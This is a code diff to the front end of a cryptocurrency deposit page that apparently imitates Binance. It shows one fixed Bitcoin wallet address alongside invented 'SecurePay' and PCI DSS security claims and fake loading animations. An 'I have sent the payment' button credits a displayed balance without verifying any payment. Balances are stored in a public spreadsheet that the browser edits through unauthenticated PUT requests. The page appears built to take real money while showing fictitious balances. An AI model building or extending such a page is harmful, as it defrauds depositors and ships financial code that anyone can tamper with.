@@ -439,6 +439,51 @@
             }
         }
         /* ========== END LOADING ANIMATION ========== */
+        
+        /* Confirmation Modal */
+        .confirm-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(12px);
+            z-index: 20000;
+            justify-content: center;
+            align-items: center;
+        }
+        .confirm-modal.active {
+            display: flex;
+        }
+        .confirm-modal-content {
+            background: #ffffff;
+            border-radius: 32px;
+            padding: 32px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: modalFadeIn 0.3s ease;
+        }
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .confirm-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+        .confirm-icon i {
+            font-size: 40px;
+            color: white;
+        }
     </style>
 </head>
 <body>
@@ -530,7 +575,7 @@
                     <div class="w-16 h-0.5 bg-gray-200"></div>
                     <div class="flex-1 text-center">
                         <div class="step w-10 h-10 rounded-full step-inactive flex items-center justify-center text-sm font-bold mx-auto mb-2 shadow-sm" id="step3Dot">3</div>
-                        <span class="text-xs font-medium text-gray-400" id="step3Label">Bitcoin Payment</span>
+                        <span class="text-xs font-medium text-gray-400" id="step3Label">Crypto Payment</span>
                     </div>
                 </div>
             </div>
@@ -543,15 +588,15 @@
                 </div>
 
                 <div class="space-y-3 mb-8">
-                    <!-- Bitcoin -->
-                    <div onclick="selectMethodWithLoading('bitcoin')" id="method-bitcoin" class="method-card rounded-2xl p-4 flex items-center justify-between group">
+                    <!-- Crypto (formerly Bitcoin) -->
+                    <div onclick="selectMethodWithLoading('crypto')" id="method-crypto" class="method-card rounded-2xl p-4 flex items-center justify-between group">
                         <div class="flex items-center gap-4">
-                            <div class="w-12 h-12 rounded-xl bg-orange-50 flex items-center justify-center">
-                                <i class="fab fa-bitcoin text-2xl text-orange-500"></i>
+                            <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-orange-500 to-yellow-500 flex items-center justify-center">
+                                <i class="fas fa-coins text-2xl text-white"></i>
                             </div>
                             <div>
-                                <p class="font-bold text-gray-900">Bitcoin (BTC)</p>
-                                <p class="text-xs text-gray-500 mt-0.5">Lightning Network • On-chain</p>
+                                <p class="font-bold text-gray-900">Crypto</p>
+                                <p class="text-xs text-gray-500 mt-0.5">Bitcoin • Lightning Network • On-chain</p>
                             </div>
                         </div>
                         <div class="flex items-center gap-2">
@@ -612,7 +657,13 @@
                 
                 <div class="mb-6">
                     <h2 class="text-lg font-bold text-gray-900 mb-1">Enter deposit amount</h2>
-                    <p class="text-sm text-gray-500"> Amount between $10 - $10,000</p>
+                    <p class="text-sm text-gray-500">Amount between $10 - $10,000</p>
+                    <div class="mt-3 p-3 bg-blue-50 rounded-xl">
+                        <div class="flex justify-between items-center">
+                            <span class="text-sm text-gray-600">Current Balance:</span>
+                            <span id="currentBalanceDisplay" class="text-lg font-bold text-blue-600">$0.00</span>
+                        </div>
+                    </div>
                 </div>
                 
                 <!-- Preset Amounts -->
@@ -658,7 +709,7 @@
                 </div>
 
                 <button onclick="goToBitcoinPaymentWithLoading()" class="btn-primary w-full py-4 rounded-xl font-bold text-white text-base flex items-center justify-center gap-2">
-                    Continue to Bitcoin Payment <i class="fab fa-bitcoin text-sm"></i>
+                    Continue to Crypto Payment <i class="fas fa-coins text-sm"></i>
                 </button>
             </div>
 
@@ -673,19 +724,19 @@
                 </div>
                 
                 <div class="text-center mb-6">
-                    <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-orange-50 border border-orange-200 mb-4">
-                        <i class="fab fa-bitcoin text-3xl text-orange-500"></i>
+                    <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-orange-500 to-yellow-500 border border-orange-200 mb-4">
+                        <i class="fas fa-coins text-3xl text-white"></i>
                     </div>
-                    <h2 class="text-xl font-bold text-gray-900 mb-1">Bitcoin Payment</h2>
-                    <p class="text-sm text-gray-500">Send exact amount to complete your deposit</p>
+                    <h2 class="text-xl font-bold text-gray-900 mb-1">Crypto Payment</h2>
+                    <p class="text-sm text-gray-500">Send exact amount in Bitcoin to complete your deposit</p>
                 </div>
                 
                 <!-- Amount to Pay Highlight -->
                 <div class="amount-highlight rounded-2xl p-5 text-center mb-6">
-                    <p class="text-gray-600 text-xs uppercase tracking-wider mb-1">Amount to send</p>
+                    <p class="text-gray-600 text-xs uppercase tracking-wider mb-1">Amount to send (USD)</p>
                     <p class="text-3xl font-bold text-gray-900" id="btcAmountDisplay">$250.00</p>
                     <p class="text-orange-500 text-xs mt-2 flex items-center justify-center gap-1">
-                        <i class="fas fa-chart-line text-[10px]"></i>
+                        <i class="fas fa-info-circle text-[10px]"></i> Send exactly this amount in Bitcoin
                     </p>
                 </div>
                 
@@ -701,7 +752,7 @@
                 <!-- Wallet Address -->
                 <div class="mb-6">
                     <p class="text-gray-500 text-xs uppercase tracking-wider text-center mb-2 flex items-center justify-center gap-2">
-                        <i class="fas fa-wallet text-xs"></i> YOUR UNIQUE BITCOIN WALLET ADDRESS
+                        <i class="fas fa-wallet text-xs"></i> BITCOIN WALLET ADDRESS
                     </p>
                     <div class="wallet-address text-gray-800 text-center mb-3 font-mono text-sm bg-gray-50">
                         bc1qqgy9uf9uzqu4c85kdn<br>qkn7vlurwwqjxmwa4wcp
@@ -713,7 +764,7 @@
                 </div>
                 
                 <!-- Payment Instructions -->
-                <div class="bg-gray-50 rounded-xl p-4 border border-gray-200">
+                <div class="bg-gray-50 rounded-xl p-4 border border-gray-200 mb-4">
                     <div class="flex items-start gap-3 mb-3">
                         <i class="fas fa-clock text-blue-500 text-sm mt-0.5"></i>
                         <p class="text-xs text-gray-600">Send exactly <span id="instructionAmount" class="font-bold text-gray-900">$250.00</span> USD worth of Bitcoin to the address above</p>
@@ -727,6 +778,11 @@
                         <p class="text-xs text-gray-600">Network fee: <span class="font-medium text-gray-900">0%</span> (paid by SecurePay)</p>
                     </div>
                 </div>
+                
+                <!-- Confirm Payment Button -->
+                <button onclick="confirmPayment()" class="btn-primary w-full py-4 rounded-xl font-bold text-white text-base flex items-center justify-center gap-2">
+                    <i class="fas fa-check-circle"></i> I have sent the payment
+                </button>
                 
                 <!-- Security Note -->
                 <div class="mt-5 text-center">
@@ -755,6 +811,21 @@
                     <span>Secure refunds</span>
                 </div>
             </div>
+        </div>
+    </div>
+
+    <!-- Confirmation Modal -->
+    <div id="confirmModal" class="confirm-modal">
+        <div class="confirm-modal-content">
+            <div class="confirm-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h3 class="text-xl font-bold text-gray-900 mb-2">Payment Confirmed!</h3>
+            <p class="text-gray-500 text-sm mb-4">Your deposit is being processed.</p>
+            <div id="confirmProgress" class="progress-track mb-4">
+                <div id="confirmProgressFill" class="progress-fill-animated" style="width: 0%;"></div>
+            </div>
+            <p class="text-xs text-gray-400">Please wait while we update your balance...</p>
         </div>
     </div>
 
@@ -789,6 +860,12 @@
     </div>
 
     <script>
+        // API Configuration
+        const API_URL = "https://api.steinhq.com/v1/storages/69c7136daffba40a626a6ec8/sheet1";
+        const TRANSACTIONS_URL = "https://api.steinhq.com/v1/storages/69c7136daffba40a626a6ec8/Transactions";
+        let currentUserEmail = null;
+        let currentUserBalance = 0;
+        
         // State
         let currentMethod = '';
         let currentAmount = 250;
@@ -808,6 +885,7 @@
         const subtotalDisplay = document.getElementById('subtotalDisplay');
         const totalDisplay = document.getElementById('totalDisplay');
         const amountError = document.getElementById('amountError');
+        const currentBalanceDisplay = document.getElementById('currentBalanceDisplay');
         
         // Loading overlay elements
         const loadingOverlay = document.getElementById('loadingOverlay');
@@ -824,6 +902,136 @@
             "Processing with PCI DSS protocols...",
             "Finalizing secure connection..."
         ];
+        
+        // SHA-256 function for password hashing (if needed)
+        async function sha256(message) {
+            const msgBuffer = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+        
+        // Fetch user balance from database
+        async function fetchUserBalance() {
+            const savedEmail = localStorage.getItem('binance_session_email');
+            if (!savedEmail) {
+                window.location.href = 'index.html';
+                return 0;
+            }
+            
+            currentUserEmail = savedEmail;
+            
+            try {
+                const response = await fetch(`${API_URL}?ignore_cache=1`);
+                const users = await response.json();
+                const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase());
+                
+                if (user) {
+                    currentUserBalance = parseFloat(user.Balance) || 0;
+                    const balanceInDollars = (currentUserBalance / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                    if (currentBalanceDisplay) {
+                        currentBalanceDisplay.innerText = `$${balanceInDollars}`;
+                    }
+                    return currentUserBalance;
+                }
+                return 0;
+            } catch (error) {
+                console.error('Error fetching user balance:', error);
+                return 0;
+            }
+        }
+        
+        // Update user balance in database
+        async function updateUserBalance(amountInCents) {
+            if (!currentUserEmail) return false;
+            
+            const newBalance = currentUserBalance + amountInCents;
+            
+            try {
+                // First, get all users to find the row index
+                const response = await fetch(`${API_URL}?ignore_cache=1`);
+                const users = await response.json();
+                const userIndex = users.findIndex(u => u.Email && u.Email.toLowerCase() === currentUserEmail.toLowerCase());
+                
+                if (userIndex === -1) return false;
+                
+                // Update the balance using PUT request with row number
+                const rowNumber = userIndex + 2; // +2 because SheetDB uses 1-indexed and row 1 is headers
+                const updateResponse = await fetch(`${API_URL}/${rowNumber}`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ Balance: newBalance })
+                });
+                
+                if (updateResponse.ok) {
+                    currentUserBalance = newBalance;
+                    const balanceInDollars = (newBalance / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                    if (currentBalanceDisplay) {
+                        currentBalanceDisplay.innerText = `$${balanceInDollars}`;
+                    }
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error('Error updating balance:', error);
+                return false;
+            }
+        }
+        
+        // Save transaction to Transactions sheet
+        async function saveTransaction(amountInCents) {
+            if (!currentUserEmail) return;
+            
+            const sign = amountInCents >= 0 ? '+' : '';
+            const transactionValue = `${sign}${amountInCents}`;
+            
+            try {
+                await fetch(TRANSACTIONS_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify([{ Email: currentUserEmail, Amount: transactionValue }])
+                });
+                console.log('Transaction saved:', transactionValue);
+            } catch (error) {
+                console.error('Failed to save transaction:', error);
+            }
+        }
+        
+        // Confirm payment and update balance
+        async function confirmPayment() {
+            const depositAmountInCents = Math.round(currentAmount * 100); // Convert dollars to cents
+            
+            // Show confirmation modal with progress
+            const confirmModal = document.getElementById('confirmModal');
+            const confirmProgressFill = document.getElementById('confirmProgressFill');
+            confirmModal.classList.add('active');
+            confirmProgressFill.style.width = '0%';
+            
+            // Animate progress
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 10;
+                confirmProgressFill.style.width = `${progress}%`;
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                }
+            }, 200);
+            
+            // Update balance and save transaction
+            const success = await updateUserBalance(depositAmountInCents);
+            
+            if (success) {
+                await saveTransaction(depositAmountInCents);
+                setTimeout(() => {
+                    confirmModal.classList.remove('active');
+                    window.location.href = 'dashboard.html';
+                }, 1500);
+            } else {
+                clearInterval(progressInterval);
+                confirmModal.classList.remove('active');
+                alert('Payment confirmation failed. Please contact support.');
+            }
+        }
 
         // Show loading animation with random duration (4-6 seconds)
         function showLoadingAnimation(callback) {
@@ -884,7 +1092,7 @@
 
         // Coming Soon Alert
         function showComingSoon(method) {
-            alert(`${method} integration is coming soon. Please use Bitcoin for now.`);
+            alert(`${method} integration is coming soon. Please use Crypto for now.`);
         }
 
         // Update progress steps
@@ -937,7 +1145,7 @@
             });
             document.getElementById(`method-${method}`).classList.add('active');
             
-            if (method === 'bitcoin') {
+            if (method === 'crypto') {
                 showLoadingAnimation(() => {
                     goToAmountPage();
                 });
@@ -1100,9 +1308,14 @@
         }
 
         // Initialize
-        updateSteps(1);
-        updateDisplayOnly();
-        setPresetAmount(250);
+        async function init() {
+            await fetchUserBalance();
+            updateSteps(1);
+            updateDisplayOnly();
+            setPresetAmount(250);
+        }
+        
+        init();
     </script>
 </body>
 </html>
